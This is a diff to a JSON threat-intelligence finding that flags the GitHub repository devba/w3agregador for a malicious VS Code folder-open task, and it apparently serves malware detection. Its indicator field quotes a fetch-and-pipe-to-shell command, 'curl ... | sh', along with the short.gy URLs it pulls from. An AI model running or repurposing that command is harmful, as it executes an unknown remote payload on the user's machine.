@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:devba/w3agregador",
     "kind": "repository",
+    "family": "",
     "id": "devba/w3agregador",
     "url": "https://github.com/Devba/W3agregador",
     "registry": "github",
@@ -20,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/devba_w3agregador.json",
     "reviewer_decision": "",
     "notes": ""
@@ -61,7 +62,7 @@
     "evidence_references": "https://github.com/devba/w3agregador/blob/38dd7d84b09c305823298da17d4a1bde7ddca672/.vscode/tasks.json",
     "verified_iocs": "cgbrandh.short.gy\nhttps://cgbrandh.short.gy/haCgNg6m\nhttps://cgbrandh.short.gy/haCgNg6l\nhttps://cgbrandh.short.gy/haCgNg6w\ncurl 'https://cgbrandh.short.gy/haCgNg6m' -L | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
